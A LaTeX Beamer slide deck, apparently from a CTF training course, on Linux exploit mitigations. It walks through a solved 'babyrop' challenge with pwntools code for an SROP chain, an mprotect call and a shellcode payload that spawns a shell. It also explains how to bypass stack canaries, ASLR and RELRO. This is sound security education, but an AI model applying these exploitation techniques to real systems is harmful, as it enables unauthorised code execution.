@@ -1,0 +1,637 @@
+\documentclass[aspectratio=169]{beamer}
+
+\usepackage{../theme/flagbot}
+\usepackage{drawstack}
+\usepackage{pgfpages}
+
+%\setbeameroption{show notes on second screen}
+
+\tikzstyle{freecell}=[fill=none]
+
+\newcommand{\reg}[1]{\%\mintinline{asm}{#1}}
+\newcommand{\hex}[1]{\mintinline{python}{0x#1}}
+\newcommand{\naddr}[2]{\begin{tabular}{l}#1\\\hex{#2}\end{tabular}}
+\newcommand{\docl}[1]{(\textbf{\href{#1}{Documentation}})}
+
+\hypersetup{colorlinks,linkcolor=,urlcolor=brightblue}
+
+\setbeamertemplate{navigation symbols}{}
+
+\showsectionframe
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% Title Setup
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\title{Lesson 3: Linux Hardening}
+\subtitle{How to defeat Linux once and for all!}
+\author{Leonardo Galli}
+\date{\today}
+
+\begin{document}
+\titleframe
+
+\tocframe
+
+\section{Previous Challenge}
+\begin{frame}
+    \frametitle{Challenge}
+    {
+        \begin{alertblock}{\textbf{babyrop}}
+            Oh no! Our fibonacci calculator is getting exploited, can you figure out how?
+            I heard it had something to do with negative numbers...\\
+            \textbf{Hints:} This binary has only readable memory, so you probably want to remove that limit ;)
+            You will probably have to use a sigreturn frame for this, since there are not enough gadgets for all registers.
+            Also, setting \reg{rax} is gonna require some effort :)\\
+            \textbf{Files:} \href{https://flagbot.ch/babyrop.zip}{babyrop.zip}\\
+            \textbf{Server:} google.jadoulr.tk 42001\\
+            \textbf{Author:} Robin Jadoul
+        \end{alertblock}
+    }
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Overflow Offset}
+    \pause
+    \begin{itemize}
+        \item Can use any technique to figure it out
+        \item I used pwntools and coredumps with cyclic
+        \item Offset is \hex{38}
+    \end{itemize}
+\end{frame}
+\begin{frame}[fragile]
+    \frametitle{Offset with pwntools}
+    \begin{codebox}{python}
+exe = context.binary = ELF("./rop")
+
+# get offset
+io = local()
+io.sendline(b"0\0" + cyclic(128))
+io.wait()
+
+core = Coredump("./core")
+offset = cyclic_find(core.fault_addr & 0xffffffff) + 2
+log.info("Buffer has offset %d", offset)\end{codebox}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Now what?}
+    \begin{itemize}
+        \item We have a buffer overflow and know correct offset
+        \item How can we get a shell?
+        \item The whole binary is read-only, nothing is writable :(
+        \pause
+        \item Use mprotect / mmap to create RWX region for shellcoding!
+        \item mprotect / mmap have a lot of arguments and binary does not have a lot of ROP gadgets
+        \item Use a sigreturn syscall to set all registers!
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{mprotect SROP}
+    \begin{itemize}
+        \pause
+        \item First we need a \inlinecode[asm]{ syscall; ret; } gadget: \hex{40127f}
+        \item Next, we need a gadget (chain) for setting \reg{rax} to \hex{f} (15 in decimal)
+        \pause
+        \item Call \inlinecode[c]{ fib(-15) }, since \reg{rax} is return value!
+        \item For this, we need to set \reg{rdi}, the first argument
+        \item Can do this with the following two gadgets:
+        \begin{itemize}
+            \item \inlinecode[asm]{pop rbx; ...; ret; }: \hex{401186}
+            \item \inlinecode[asm]{mov rdi, rbx; ret; }: \hex{401260}
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{ROP Chain}
+    \begin{codebox}{python}
+frame = SigreturnFrame()
+frame.rax = ... # setting up SROP here, explanation will come later
+
+rop = ROP(exe)
+rop.call(pop_rbx)
+rop.raw(-constants.SYS_rt_sigreturn) # set rbx = -15
+rop.raw("A"*8) # filler
+rop.call(mov_rdi_rbx) # set rdi = rbx
+rop.call(exe.symbols.fib) # call fib(rdi) = fib(-15) -> sets rax = 15
+rop.call(syscall_ret) # jump to syscall ret gadget,
+                      # since rax = 15 will execute sigreturn
+rop.raw(frame) # sigreturn frame contents\end{codebox}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{SigreturnFrame Setup}
+    \begin{itemize}
+        \item Things we need to decide:
+        \begin{itemize}
+            \item mprotect or mmap?
+            \item value of \reg{rip}
+            \item value of \reg{rsp}
+            \item plan for what to do after we return from syscall
+        \end{itemize}
+        \pause
+        \item binary is not stripped, so we have list of its symbols somewhere in memory
+        \item If we point \reg{rsp} to that location, we can continue ROPing! Our Plan:
+        \begin{enumerate}
+            \item mprotect the whole binary to RWX
+            \item set \reg{rsp} to \hex{402240}, since we have a pointer to vuln there
+            \item after mprotect, execute return, and so jumping back to vuln
+            \item we can overflow again, but this time know the buffer location and it is RWX!
+        \end{enumerate}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{SigreturnFrame Setup}
+    \begin{itemize}
+        \item sigreturn can set all registers for us
+        \item we set \reg{rsp} as explained before, \reg{rax} to \hex{a} (mprotect) and \reg{rip} to a \inlinecode[asm]{ syscall; ret; } gadget.
+        \item hence our frame looks like:
+    \end{itemize}
+    \begin{codebox}{python}
+frame = SigreturnFrame()
+frame.rax = constants.SYS_mprotect # for syscall
+frame.rdi = addr # address we want to mprotect, here 0x402000
+frame.rsi = 0x1000 # amount of bytes we want to mprotect
+frame.r10 = constants.MAP_FIXED # not really needed
+frame.rdx = constants.eval('PROT_READ | PROT_WRITE | PROT_EXEC') # RWX
+frame.rsp = 0x402240 # our "fake" stack after mprotect
+frame.rip = syscall_ret # syscall ret gadget\end{codebox}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Shellcoding}
+    \begin{itemize}
+        \item now vuln is being executed again, however now we know buffer location and stack is RWX!
+        \item buffer overflow, but use it to immediately jump to our buffer!
+        \item fill rest of buffer contents with shellcode:
+    \end{itemize}
+    \begin{codebox}{python}
+shellcode = 0x402250 # location of our buffer
+
+io.sendline(fit({
+    0: b"0\0",
+    offset: shellcode, # overwrite rip with shellcode location
+    offset + 8: asm(shellcraft.sh()) # shellcode for getting a shell
+}))\end{codebox}
+\end{frame}
+
+{
+\hidesectionframe
+\showsubsectionframe
+\section{Exploit Mitigations}
+
+\subsection{Data Execution Prevention (DEP)}
+
+\begin{frame}[fragile]
+    \frametitle{The Good Old Days}
+    \begin{itemize}
+        \item Initially, CPU and OS did not care where \reg{rip} points to
+        \item Could point to data (stack or program data) and would still continue executing
+        \item Heavily abused by us for e.g. shellcoding (just write some shellcode in data and jump to data)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Data Execution Prevention (DEP)}
+    \begin{itemize}
+        \item To alleviate this, allow marking of memory regions as not executable
+        \item Has many different names, but they all mean a similar thing:
+        \begin{itemize}
+            \item NX (Non-Execute) Bit is hardware on x64 processors responsible for this
+            \item No-Exec Stack GCC flag to mark stack non executable
+            \item W\^{}X (Write XOR eXecute) in OpenBSD
+        \end{itemize}
+        \item Usually done in hardware, so quite effective
+        \item When trying to jump to NX memory, program will segfault :(
+        \item Enabled by default, even for most CTFs!
+    \end{itemize}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Working Around DEP}
+    \begin{itemize}
+        \item ROPing is not directly prevented with DEP
+        \item Use ROP to execute mmap / mprotect and DEP is "removed"
+        \item Find memory region in binary that might still be RWX
+        \item Sometimes RWX is necessary and hence can be exploited:
+        \begin{itemize}
+            \item Any JIT engine (Just In Time) such as JavaScript, Java or even C\# (with mono)
+            \item Often Browsers are the main culprit
+            \item In general, any interpreted language (also python)
+        \end{itemize}
+    \end{itemize}
+
+\end{frame}
+
+\subsection{Stack Canary}
+
+\begin{frame}
+    \frametitle{Up to Now}
+    \begin{itemize}
+        \item Any buffer overflow immediately leads to overwriting \reg{rip}
+        \item Do not care about contents of buffer before \reg{rip}
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Stack Canary}
+    \begin{itemize}
+        \item Prevent Buffer Overflows by adding a secret value in front of \reg{rip}
+        \item Check the integrity of the secret value before returning!
+        \item Many different names:
+        \begin{itemize}
+            \item Stack Smashing Protector (SSP)
+            \item Stack Cookie / Canary
+        \end{itemize}
+        \item Is generated per-process, not per-function!
+        \item Usually, first byte is a null-byte, and hence you cannot leak it easily
+        \item Enabled by default for normal applications (CTFs not necessarily!)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Example 1: Need for a Null Byte}
+    \begin{columns}
+        \begin{column}{0.5\textwidth}
+        \begin{codebox}{c}
+int callme() {
+    long canary = get_canary();
+    char name[16];
+    gets(name); |\nline{1}|
+    printf("Hello %s", name); |\nline{2}|
+    if (canary != get_canary())
+        __stack_chk_fail();
+    return 2; |\nline{3}|
+}\end{codebox}
+        \end{column}
+        \begin{column}{0.5\textwidth}
+            \begin{figure}[H]
+                \centering
+                \begin{drawstack}[scale=0.7, every node/.style={scale=0.7}]
+                    \startframe
+                    \cell{\hex{7fe0}} \cellcom{\naddr{saved \reg{rbp}}{7fc0}}
+                    \cell{\hex{4012ae}}\cellcom{\naddr{saved \reg{rip}}{7fb8}}
+                    \cell{\hex{8ba01867943f8f78}}\cellcom{\naddr{canary}{7fb0}}
+                    \cell{} \cellcom{\naddr{\mintinline{c}{name[8:15]}}{7fa8}}
+                    \node[draw,minimum height=1cm,anchor=east] (n8) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[8]}}\only<2->{\mintinline{c}{'A'}}};
+                    \node[] at (0, \value{cellnb}) {\dots};
+                    \node[draw,minimum height=1cm,anchor=west] (n15) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[15]}}\only<2->{\mintinline{c}{'A'}}};
+                    \cell{} \cellcom{\naddr{\mintinline{c}{name[0:7]}}{7fa0}}
+                    \node[draw,minimum height=1cm,anchor=east] (n0) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[0]}}\only<2->{\mintinline{c}{'A'}}};
+                    \node[] at (0, \value{cellnb}) {\dots};
+                    \node[draw,minimum height=1cm,anchor=west] (n7) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[7]}}\only<2->{\mintinline{c}{'A'}}};
+                    \finishframe{{\tt callme}\\stack frame}
+    
+                    \draw[->] (2.15,0) -- node[auto, sloped]{stack growth} (2.15, \value{cellnb}-1);
+                \end{drawstack}
+                  
+                
+                \caption{The Stack}
+                \label{fig:stack}
+            \end{figure}
+        \end{column} 
+        \end{columns}
+        \begin{onlyenv}<2>
+        Output: \inlinecode[python]{"Hello AAAAAAAAAAAAAAAAx???g??"}
+        \end{onlyenv}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Example 2: Leaking with Null Byte}
+    \begin{columns}
+        \begin{column}{0.5\textwidth}
+        \begin{codebox}{c}
+int callme() {
+    long canary = get_canary();
+    char name[16];
+    gets(name); |\nline{1}|
+    printf("Hello %s", name); |\nline{2}|
+    if (canary != get_canary())
+        __stack_chk_fail();
+    return 2; |\nline{3}|
+}\end{codebox}
+        \end{column}
+        \begin{column}{0.5\textwidth}
+            \begin{figure}[H]
+                \centering
+                \begin{drawstack}[scale=0.7, every node/.style={scale=0.7}]
+                    \startframe
+                    \cell{\hex{7fe0}} \cellcom{\naddr{saved \reg{rbp}}{7fc0}}
+                    \cell{\hex{4012ae}}\cellcom{\naddr{saved \reg{rip}}{7fb8}}
+                    \cell{\hex{8ba01867943f8f00}}\cellcom{\naddr{canary}{7fb0}}
+                    \cell{} \cellcom{\naddr{\mintinline{c}{name[8:15]}}{7fa8}}
+                    \node[draw,minimum height=1cm,anchor=east] (n8) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[8]}}\only<2->{\mintinline{c}{'A'}}};
+                    \node[] at (0, \value{cellnb}) {\dots};
+                    \node[draw,minimum height=1cm,anchor=west] (n15) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[15]}}\only<2->{\mintinline{c}{'A'}}};
+                    \cell{} \cellcom{\naddr{\mintinline{c}{name[0:7]}}{7fa0}}
+                    \node[draw,minimum height=1cm,anchor=east] (n0) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[0]}}\only<2->{\mintinline{c}{'A'}}};
+                    \node[] at (0, \value{cellnb}) {\dots};
+                    \node[draw,minimum height=1cm,anchor=west] (n7) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[7]}}\only<2->{\mintinline{c}{'A'}}};
+                    \finishframe{{\tt callme}\\stack frame}
+    
+                    \draw[->] (2.15,0) -- node[auto, sloped]{stack growth} (2.15, \value{cellnb}-1);
+                \end{drawstack}
+                  
+                
+                \caption{The Stack}
+                \label{fig:stack}
+            \end{figure}
+        \end{column} 
+        \end{columns}
+        \begin{onlyenv}<2>
+        Output: \inlinecode[python]{"Hello AAAAAAAAAAAAAAAA"}
+        \end{onlyenv}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Example 3: Leaking with Null Byte and Crashing}
+    \begin{columns}
+        \begin{column}{0.5\textwidth}
+        \begin{codebox}{c}
+int callme() {
+    long canary = get_canary();
+    char name[16];
+    gets(name); |\nline{1}|
+    printf("Hello %s", name); |\nline{2}|
+    if (canary != get_canary())
+        __stack_chk_fail(); |\nline{3}|
+    return 2; 
+}\end{codebox}
+        \end{column}
+        \begin{column}{0.5\textwidth}
+            \begin{figure}[H]
+                \centering
+                \begin{drawstack}[scale=0.7, every node/.style={scale=0.7}]
+                    \startframe
+                    \cell{\hex{7fe0}} \cellcom{\naddr{saved \reg{rbp}}{7fc0}}
+                    \cell{\hex{4012ae}}\cellcom{\naddr{saved \reg{rip}}{7fb8}}
+                    \cell{\only<1>{\hex{8ba01867943f8f00}}\only<2->{\hex{8ba01867943f8f41}}}\cellcom{\naddr{canary}{7fb0}}
+                    \cell{} \cellcom{\naddr{\mintinline{c}{name[8:15]}}{7fa8}}
+                    \node[draw,minimum height=1cm,anchor=east] (n8) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[8]}}\only<2->{\mintinline{c}{'A'}}};
+                    \node[] at (0, \value{cellnb}) {\dots};
+                    \node[draw,minimum height=1cm,anchor=west] (n15) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[15]}}\only<2->{\mintinline{c}{'A'}}};
+                    \cell{} \cellcom{\naddr{\mintinline{c}{name[0:7]}}{7fa0}}
+                    \node[draw,minimum height=1cm,anchor=east] (n0) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[0]}}\only<2->{\mintinline{c}{'A'}}};
+                    \node[] at (0, \value{cellnb}) {\dots};
+                    \node[draw,minimum height=1cm,anchor=west] (n7) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[7]}}\only<2->{\mintinline{c}{'A'}}};
+                    \finishframe{{\tt callme}\\stack frame}
+    
+                    \draw[->] (2.15,0) -- node[auto, sloped]{stack growth} (2.15, \value{cellnb}-1);
+                \end{drawstack}
+                  
+                
+                \caption{The Stack}
+                \label{fig:stack}
+            \end{figure}
+        \end{column} 
+        \end{columns}
+        \begin{onlyenv}<2>
+        Output: \inlinecode[python]{"Hello AAAAAAAAAAAAAAAAA???g??"}
+        \end{onlyenv}
+        \begin{onlyenv}<3>
+        Output: \inlinecode[python]{"*** stack smashing detected ***: <unknown> terminated"}
+        \end{onlyenv}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Working Around Stack Canaries}
+    \begin{itemize}
+        \item If you have a relative (or absolute) write to memory, you can skip writing the canary!
+        \item You can try leaking the canary, if you have a way to read memory
+        \item If return never called (or not immediately), you can still overwrite Null Byte and leak canary
+        \item Overwrite global data (not protected)
+        \begin{itemize}
+            \item Could allow overwriting of addresses, if they are stored in global variables
+            \item Or overwriting of ELF information
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\subsection{Address Space Layout Randomization (ASLR)}
+\begin{frame}
+    \frametitle{Up to Now}
+    \begin{itemize}
+        \item Code execution is very deterministic
+        \item Once you found a usable address (with e.g. gdb) you can reuse it
+        \item In the "good old days", everything was deterministic, even stack!
+        \item Made exploitation very easy, since you always knew where stack and libc were
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Address Space Layout Randomization (ASLR)}
+    \begin{itemize}
+        \item Randomize memory layout to make exploitation more difficult
+        \item Stack can be at randomized location automatically and is done by default on most OS
+        \item For code, programmer needs to compile with PIC (Position Independent Code) generating a PIE (Position Independent Executable)
+        \begin{itemize}
+            \item Done by default for shared libraries such as libc
+            \item You cannot know where system function is, without knowing base of libc
+            \item Often, main program is not compiled with PIC however
+            \item If main program is compiled with PIC, you cannot easily use gadgets!
+        \end{itemize}
+        \item Only base address is randomized, not e.g. the relative positions of different functions!
+        \item Once you know the base of a PIE, you know where all functions are!
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Randomization}
+    \begin{itemize}
+        \item Pages have to be aligned, meaning lowest 12 bits are known!
+        \item Address space restricted in x86, for example PIE base only has 8 bits of randomization!
+        \item On x64 much more bits available!
+        \item Not re-applied when you call \inlinecode[c]{fork()}!
+    \end{itemize}
+\end{frame}
+
+\subsection{General Tips against Randomization}
+
+\begin{frame}
+    \frametitle{Partial Overwrites}
+    \begin{itemize}
+        \item A lot of places store existing addresses (such as GOT or stack)
+        \item Only overwrite part of existing address!
+        \begin{itemize}
+            \item If new and old address share last byte, no bruteforce needed!
+            \item Often however, they differ in the last two or three bytes.
+            \item Still, only 4-12 bits of brute force needed!
+        \end{itemize}
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Forking is bad}
+    \begin{itemize}
+        \item Nothing is re-randomized when you call \inlinecode[c]{fork()}!
+        \item If you cause a crash in the child, parent will still have same canary, PIE base, etc.
+        \item Often useful in programs that handle their own network connection:
+        \begin{itemize}
+            \item Accept incoming connection
+            \item Fork
+            \item If in child, run actually program (you will be talking to the child)
+            \item If in parent continue accepting connections
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Leaking with Forks}
+    \begin{itemize}
+        \item Can overwrite Null Byte for a leak, since crash is not important
+        \item Can brute force byte by byte:
+        \begin{codebox}{python}
+for byte in range(0, 255): # usually first byte should be null!
+    payload = fit(canary_offset: p8(byte)) # don't use p64,
+            # otherwise you will overwrite all of the canary!
+    did_crash = send_payload(payload)
+    if not did_crash:
+        log.info("First byte of canary is: 0x%x", byte)
+        break\end{codebox}
+    \end{itemize}
+\end{frame}
+
+\subsection{Relocation Read-Only (RELRO)}
+
+\begin{frame}
+    \frametitle{Dynamic Symbol Resolution}
+    \begin{itemize}
+        \item libc is an example of a dynamic library, any symbols used are dynamically resolved
+        \item If libc is randomized, how can binary know where e.g. system is located?
+        \item Procedural Linkage Table (PLT) and Global Offset Table (GOT) to the rescue!
+        \begin{itemize}
+            \item GOT stores addresses of dynamic symbols
+            \item PLT contains small stubs, that jump to the address stored in the GOT
+            \item At the beginning GOT points back to PLT, which in turn then jumps to linker to resolve symbol location and write to GOT
+            \item Once symbol is resolved once, PLT will directly jump to correct address
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Using GOT to our Advantage}
+    \begin{itemize}
+        \item If we call \inlinecode[c]{puts(printf@got)} we can leak libc address!
+        \item If we overwrite GOT entry, we can execute arbitrary symbols!
+        \item Can be achieved with ROP, data segment overflow or other means
+        \item Usually, want to overwrite something like exit, since it will be called at the end
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Partial RELRO}
+    \begin{itemize}
+        \item Rearrange sections, so that global data overflow should not overflow into GOT, PLT, etc.
+        \item Maps parts of the GOT read-only
+        \item However, important parts are still read-write!
+    \end{itemize}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Full RELRO}
+    \begin{itemize}
+        \item Do everything from Partial RELRO
+        \item Resolve all symbols before main function runs
+        \item Map all of the GOT as read-only!
+        \item However, often not used, as it can slow down program startup time!
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Defeating Full RELRO}
+    \begin{itemize}
+        \item Currently, no way of actually defeating full RELRO known
+        \item However, there are always other sections which can be overwritten leading to code execution:
+        \begin{itemize}
+            \item global file structs
+            \item \inlinecode[c]{__malloc_hook}
+            \item linker global symbols
+            \item etc.
+        \end{itemize}
+        \item More information in Further Readings
+    \end{itemize}
+
+\end{frame}
+}
+
+\section{Other Tips}
+
+\begin{frame}[fragile]
+    \frametitle{Identifying Protections}
+    \begin{itemize}
+        \item pwntools includes helper program called checksec
+        \item Usage: \inlinecode[bash]{checksec ./vuln}
+        \item Shows you:
+        \begin{itemize}
+            \item Architecture
+            \item RELRO (No, Partial, Full)
+            \item Stack Canary (No, Yes)
+            \item NX (No, Yes): No-Exec Stack
+            \item PIE (No, Yes)
+            \item If there are RWX segments present
+        \end{itemize}
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Identifying a Libc}
+    \begin{itemize}
+        \item To find exact address of system or one gadgets, you need to have exact libc binary!
+        \item Easy to do, if running locally, but what about the server?
+        \pause
+        \item Different symbols always have the same relative address for the same binary!
+        \item Leak address of three or four libc symbols
+        \item Use online database \href{https://libc.blukat.me}{libc database} to find the one on the server
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{one\_gadget}
+    \begin{itemize}
+        \item Setting up arguments for execve / system call can be annoying
+        \item Usually, libc can do the work for you!
+        \item one\_gadget is a tool that will give you addresses in libc, which call \inlinecode[c]{execve("/bin/sh", 0, 0)} for you
+        \item Will also tell you any constraints you need to fulfill, to prevent a crash
+    \end{itemize}
+
+\end{frame}
+
+\section{Further Readings}
+\begin{frame}[fragile]
+    \frametitle{Defeating Mitigations}
+    \begin{itemize}
+        \item ASLR
+        \begin{itemize}
+            \item \href{https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems-wp.pdf}{Exploiting Linux and PaX ASLR’s weaknesses on 32- and 64-bit systems}
+        \end{itemize}
+        \item Full RELRO
+        \begin{itemize}
+            \item \href{https://atum.li/2017/11/08/babyfs/}{BabyFS Writeup}: Abusing file structs 
+            \item \href{https://made0x78.com/bseries-fullrelro/}{Full RELRO Bypass} using \inlinecode[c]{__malloc_hook}
+            \item \href{}{} using libc exit routines
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\section{Challenge}
+
+\begin{frame}[fragile]
+    \frametitle{Challenge}
+    {
+        \begin{alertblock}{\textbf{protections}}
+            On the surface this challenge should be very easy to exploit, however, there are some protections...\\
+            \textbf{Hints:} No hints this time! Please do not run to many concurrent attempts, otherwise the server will be overloaded!\\
+            \textbf{Files:} \href{https://flagbot.ch/protections.zip}{protections.zip}\\
+            \textbf{Server:} google.jadoulr.tk 42002\\
+            \textbf{Author:} Robin Jadoul
+        \end{alertblock}
+    }
+\end{frame}
+\end{document}
